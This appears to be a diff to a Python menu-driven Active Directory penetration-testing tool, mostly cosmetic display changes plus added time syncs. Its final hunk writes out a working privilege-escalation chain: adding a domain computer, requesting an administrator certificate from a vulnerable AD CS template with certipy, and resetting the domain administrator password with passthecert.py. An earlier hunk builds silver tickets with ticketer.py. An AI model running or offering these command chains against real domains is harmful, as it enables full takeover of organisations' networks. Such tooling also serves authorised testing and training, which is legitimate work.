@@ -113,6 +113,9 @@ def nmapTrim(variable):
 
 # OUTPUT THE FILE CONTENTS IN GREEN   
 def catsFile(variable):
+   if not os.path.exists(variable):
+      print("[-] File not found...")
+      return
    parsFile(variable)
    CHAR_DELAY = 0.05 
    filename = variable
@@ -700,13 +703,13 @@ def smbParser(smbfile):
 
 # DISPLAY SCREEN 
 def dispMenu():
-   print('\u2554' + ('\u2550')*14 + '\u2566' + ('\u2550')*42 + '\u2566' + ('\u2550')*46 + '\u2566' + ('\u2550')*58 + '\u2566' + ('\u2550')*7 + '\u2566' + ('\u2550')*34 + '\u2566' + ('\u2550')*7 + '\u2566' + ('\u2550')*34 + '\u2566' + ('\u2550')*30 + '\u2557')
+   print('\u2554' + ('\u2550')*14 + '\u2566' + ('\u2550')*43 + '\u2566' + ('\u2550')*46 + '\u2566' + ('\u2550')*58 + '\u2566' + ('\u2550')*7 + '\u2566' + ('\u2550')*34 + '\u2566' + ('\u2550')*7 + '\u2566' + ('\u2550')*34 + '\u2566' + ('\u2550')*29 + '\u2557')
    print('\u2551' + " TIME ", end =' ')   
    if SKEW == 0:
       print(colored(LTM[:6],colour7), end=' ')
    else:
       print(colored(LTM[:6],colour6), end=' ')      
-   print('\u2551' + " " + colored("REMOTE COMPUTER NAME",colour5), end=' ')   
+   print('\u2551' + " " + colored("REMOTE COMPUTER NAME:",colour5), end=' ')   
    if COM[:7] == "UNKNOWN":
       print(colored(COM.upper(),colour7), end=' ')
    else:
@@ -714,8 +717,8 @@ def dispMenu():
    print('\u2551' + (" ")*1 + colored("SHARENAME",colour5) + (" ")*7 + colored("TYPE",colour5) + (" ")*6 + colored("COMMENT",colour5) + (" ")*12 + '\u2551' + (" ")*1 + colored("USERNAMES",colour5) + (" ")*15 + colored("NTFS PASSWORD HASH",colour5) + (" ")*15 + '\u2551' + " PORT  " + '\u2551' + " TCP SERVICE" + (" ")*22 + '\u2551' + " PORT  " + '\u2551' + " UDP SERVICE" + (" ")*22 + '\u2551' + " LOCAL IP ", end=' ')
 # ADD IN THE NUMER OF USERNAMES IN THE LIST ON THE BANNER HERE   
    print(colored(localIP2,colour6), end=' ') 
-   print((" ")*3 + '\u2551') 
-   print('\u2560' + ('\u2550')*14 + '\u256C' + ('\u2550')*42 + '\u256C' + ('\u2550')*25 + '\u2550' + ('\u2550')*20 + '\u256C' + ('\u2550')*58 + '\u256C' + ('\u2550')*7 + '\u256C' + ('\u2550')*34 + '\u256C' + ('\u2550')*7 + '\u256C' + ('\u2550')*34 + '\u256C' +  ('\u2550')*30 + '\u2563')   
+   print((" ")*2 + '\u2551') 
+   print('\u2560' + ('\u2550')*14 + '\u256C' + ('\u2550')*43 + '\u256C' + ('\u2550')*25 + '\u2550' + ('\u2550')*20 + '\u256C' + ('\u2550')*58 + '\u256C' + ('\u2550')*7 + '\u256C' + ('\u2550')*34 + '\u256C' + ('\u2550')*7 + '\u256C' + ('\u2550')*34 + '\u256C' +  ('\u2550')*29+ '\u2563')   
    for loop in range(0,scrnLen - 4):
       print('\u2551' + " " + coloum_one_Labels[loop] + "  " +  '\u2551', end=' ')
       if (loop == 0) & (OSF[:5] == "EMPTY"):
@@ -832,7 +835,7 @@ def dispMenu():
       print('\u2551', end=' ')   
       print(colored(servsUDP[loop], colour6), end=' ')              
       print('\u2551' + " " + coloum_nine_Labels[loop] + " " + '\u2551')
-   print('\u2560' + ('\u2550')*14 + '\u2569' + ('\u2550')*42 + '\u2569' + ('\u2550')*25 + '\u2550' + ('\u2550')*20 + '\u2569' + ('\u2550')*58 + '\u2569' + ('\u2550')*7 + '\u2569' + ('\u2550')*34 + '\u2569' + ('\u2550')*7 + '\u2569' + ('\u2550')*34 + '\u2569' +  ('\u2550')*30+ '\u2563' )
+   print('\u2560' + ('\u2550')*14 + '\u2569' + ('\u2550')*43 + '\u2569' + ('\u2550')*25 + '\u2550' + ('\u2550')*20 + '\u2569' + ('\u2550')*58 + '\u2569' + ('\u2550')*7 + '\u2569' + ('\u2550')*34 + '\u2569' + ('\u2550')*7 + '\u2569' + ('\u2550')*34 + '\u2569' +  ('\u2550')*29+ '\u2563' )
    return
 
 # DISPLAY MENU   
@@ -1102,7 +1105,7 @@ DOMC2 = 0					# SUB DOMAIN SWITCH
 DNSC = 0                                	# DNS SWITCH
 HTTP = 0					# HTTP SERVER PORT
 COL0 = 19					# MAX LEN COMPUTER NAME
-COL1 = 40                               	# MAX LEN SESSION DATA
+COL1 = 41                               	# MAX LEN SESSION DATA
 COL2 = 44                               	# MAX LEN SHARE NAME
 COL3 = 23                               	# MAX LEN USER NAME
 COL4 = 32                               	# MAX LEN NTLM HASH
@@ -1141,32 +1144,32 @@ coloum_one_Labels[21] = "COMMUNITY  "
 coloum_one_Labels[22] = "FUZZ  RIDER"
 coloum_one_Labels[23] = "WORD   LIST"
 coloum_nine_Labels = [" "*COL1]*scrnLen	# LABELS
-coloum_nine_Labels[0]  = "............................"
-coloum_nine_Labels[1]  = "...........█████............"
-coloum_nine_Labels[2]  = ".........██     ██.........."
-coloum_nine_Labels[3]  = "........█         █........."
-coloum_nine_Labels[4]  = ".......█...................."
-coloum_nine_Labels[5]  = ".......█...................."
-coloum_nine_Labels[6]  = "........█         █........."
-coloum_nine_Labels[7]  = ".........██     ██.........."
-coloum_nine_Labels[8]  = "...........█████............"
-coloum_nine_Labels[9]  = "............................"
-coloum_nine_Labels[10] = ".............█.............."
-coloum_nine_Labels[11] = ".............█.............."
-coloum_nine_Labels[12] = ".............█.............."
-coloum_nine_Labels[13] = ".............█.............."
-coloum_nine_Labels[14] = ".............█.............."
-coloum_nine_Labels[15] = "............................"
-coloum_nine_Labels[16] = ".............█.............."
-coloum_nine_Labels[17] = "............█ █............."
-coloum_nine_Labels[18] = "...........█   █............"
-coloum_nine_Labels[19] = "..........███████..........."
-coloum_nine_Labels[20] = ".........█       █.........."
-coloum_nine_Labels[21] = "........█         █........."
-coloum_nine_Labels[22] = ".......█           █........"
-coloum_nine_Labels[23] = "............................"
-communityString = "public                                  "
-FuzzRider = "--hl 7                                  "
+coloum_nine_Labels[0]  = "..........................."
+coloum_nine_Labels[1]  = "..........█████............"
+coloum_nine_Labels[2]  = "........██     ██.........."
+coloum_nine_Labels[3]  = ".......█         █........."
+coloum_nine_Labels[4]  = "......█...................."
+coloum_nine_Labels[5]  = "......█...................."
+coloum_nine_Labels[6]  = ".......█         █........."
+coloum_nine_Labels[7]  = "........██     ██.........."
+coloum_nine_Labels[8]  = "..........█████............"
+coloum_nine_Labels[9]  = "..........................."
+coloum_nine_Labels[10] = "............█.............."
+coloum_nine_Labels[11] = "............█.............."
+coloum_nine_Labels[12] = "............█.............."
+coloum_nine_Labels[13] = "............█.............."
+coloum_nine_Labels[14] = "............█.............."
+coloum_nine_Labels[15] = "..........................."
+coloum_nine_Labels[16] = "............█.............."
+coloum_nine_Labels[17] = "...........█ █............."
+coloum_nine_Labels[18] = "..........█   █............"
+coloum_nine_Labels[19] = ".........███████..........."
+coloum_nine_Labels[20] = "........█       █.........."
+coloum_nine_Labels[21] = ".......█         █........."
+coloum_nine_Labels[22] = "......█           █........"
+coloum_nine_Labels[23] = "..........................."
+communityString = "public                                   "
+FuzzRider = "--hl 7                                   "
 currentWordlist = "/usr/share/seclists/Discovery/Web-Content/common.txt"
 
 # -------------------------------------------------------------------------------------
@@ -2142,17 +2145,17 @@ while True:
          localCOM("sed -i 's/(SidTypeGroup)//g' group.tmp")
          localCOM("sed -i 's/(SidTypeUser)//g'  users.tmp")                           
          if os.path.getsize("alias.tmp") != 0:
-            print("[+] Found Aliases...\n")
+            print("[+] Found Aliases...")
             catsFile("alias.tmp")
          else:
             print("[+] Unable to find aliases...")                                    
          if os.path.getsize("group.tmp") != 0:
-            print("\n[+] Found Groups...\n")
+            print("\n[+] Found Groups...")
             catsFile("group.tmp")
          else:
             print("[+] Unable to find groups...")                                  
          if os.path.getsize("users.tmp") != 0:
-            print("\n[+] Found Users...\n")
+            print("\n[+] Found Users...")
             catsFile("users.tmp")
          else:
             print("[+] Unable to find usernames...")                              
@@ -2821,6 +2824,7 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='61':
+      SKEW = timeSync(SKEW)
       checkParam = test_TIP()
       if checkParam != 1:
          checkParam = test_DOM()
@@ -2852,6 +2856,7 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '62':
+      SKEW = timeSync(SKEW)
       checkParam = test_TIP()     
       if checkParam != 1:
          checkParam = test_DOM()         
@@ -2861,7 +2866,7 @@ while True:
          print(colored("[*] Trying to create silver TGT for user " + USR.rstrip(" ") + "...", colour3))                  
          if (NTM[:1] != "") & (SID[:1] != ""):
             print("[i] Using HASH value as password credential...")
-            remoteCOM(keyPath + "ticketer.py -nthash :" + NTM.rstrip("\n") + " -domain-sid " + SID.rstrip("\n") + " -domain " + DOM.rstrip(" ") + " -spn CIFS/DESKTOP-01." + DOM.rstrip(" ") + " " + USR.rstrip(" "))            
+            remoteCOM(keyPath + "ticketer.py -nthash :" + NTM.rstrip("\n") + " -domain-sid " + SID.rstrip(" ") + " -domain " + DOM.rstrip(" ") + " -spn CIFS/DESKTOP-01." + DOM.rstrip(" ") + " " + USR.rstrip(" "))            
          if os.path.exists(USR.rstrip(" ") + ".ccache"):
             print("[+] Checking silver TGT status...")
             TGT = privCheck()
@@ -2879,6 +2884,7 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '63':
+      SKEW = timeSync(SKEW)
       checkParam = test_TIP()      
       if checkParam != 1:
          checkParam = test_DOM()         
@@ -2905,6 +2911,7 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='64':
+      SKEW = timeSync(SKEW)
       checkParam = test_TIP()      
       if checkParam != 1:
          checkParam = test_DOM()               
@@ -2925,6 +2932,7 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='65':
+      SKEW = timeSync(SKEW)
       userAD = input("[?] Please enter the AD username: ")   
       hashTicket = input("[?] Please enter the hash value: ")
       localCOM("echo " + hashTicket + " > " + userAD + ".kirbi") 
@@ -4953,20 +4961,32 @@ while True:
       if checkParams != 1:      
          print(colored("[*] Checking privilges...", colour3))
          SKEW = timeSync(SKEW)
-         remoteCOM("crackmapexec winrm " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -x 'whoami /priv' > priv.tmp")
+         remoteCOM("nxc winrm " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -x 'whoami /priv' > priv.tmp")
          catsFile("priv.tmp")
          with open("priv.tmp") as file:
             contents = file.read()
             if "SeMachineAccountPrivilege" in contents:
                print(colored("[*] Creating new Domain Computer...", colour3))
-               localCOM(keyPath + "addcomputer.py -computer-name shtnx_pc -computer-pass 1234 " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") + "' -dc-ip " + TIP.rstrip(" "))
-               print(colored("[*] Enrolling into the vulnerable template, and supplying a SAN...", colour3)) 
-               group = input("\n[?] Please enter group name to assign: ")
-               localCOM("certipy req -username 'shtnx_pc$' -p 1234 -dc-ip " + TIP.rstrip(" ") + " -ca AUTHORITY-CA -upn administrator@" + DOM.rstrip(" ") + " -template " + group +" -debug")               
-               localCOM("certipy cert -pfx administrator.pfx -nokey -out user.crt")
-               localCOM("certipy cert -pfx administrator.pfx -nocert -out user.key")
-               localCOM(keyPath + "passthecert.py -crt user.crt -key user.key -dc-ip " + TIP.rstrip(" ") + " -domain " + DOM.rstrip(" ") + " -action whoami")
-               localCOM(keyPath + "passthecert.py -crt user.crt -key user.key -dc-ip " + TIP.rstrip(" ") + " -domain " + DOM.rstrip(" ") + " -action modify_user -target administrator -new-pass H@ck3r!!!")
+               localCOM(keyPath + "addcomputer.py -computer-name shtnx_pc -computer-pass 1234 " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") + "' -dc-ip " + TIP.rstrip(" ") + " > out.tmp")
+               catsFile("out.tmp")
+               with open("out.tmp") as file:
+                  contents = file.read()
+                  if "[-] Relayed user machine quota exceeded!" in contents:
+#                    Exploit one failed - trying exploit two...
+                     group = input("\n[?] Please enter template name to assign: ")
+                     base = DOM.split(".", 1)[0]
+                     localCOM("certipy req -u " + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -p " + PAS.rstrip(" ") + " -upn administrator@" + DOM.rstrip(" ") + " -target " + DOM.rstrip(" ") + " -ca " + base + "-dc-ca -template " +  group + " > out.tmp")
+                     catsFile("out.tmp")
+                     localCOM("certipy auth -pfx administrator.pfx -dc-ip " + TIP.rstrip(" ") + " > out.tmp")
+                     catsFile("out.tmp")
+                  else:
+                     print(colored("[*] Enrolling into the vulnerable template, and supplying a SAN...", colour3)) 
+                     group = input("\n[?] Please enter template name to assign: ")
+                     localCOM("certipy req -username 'shtnx_pc$' -p 1234 -dc-ip " + TIP.rstrip(" ") + " -ca AUTHORITY-CA -upn administrator@" + DOM.rstrip(" ") + " -template " + group)               
+                     localCOM("certipy cert -pfx administrator.pfx -nokey -out user.crt")
+                     localCOM("certipy cert -pfx administrator.pfx -nocert -out user.key")
+                     localCOM(keyPath + "passthecert.py -crt user.crt -key user.key -dc-ip " + TIP.rstrip(" ") + " -domain " + DOM.rstrip(" ") + " -action whoami")
+                     localCOM(keyPath + "passthecert.py -crt user.crt -key user.key -dc-ip " + TIP.rstrip(" ") + " -domain " + DOM.rstrip(" ") + " -action modify_user -target administrator -new-pass H@ck3r!!!")
             else:
                print("[-] SeMachineAccountPrivilege is not enabled...")
       prompt() 
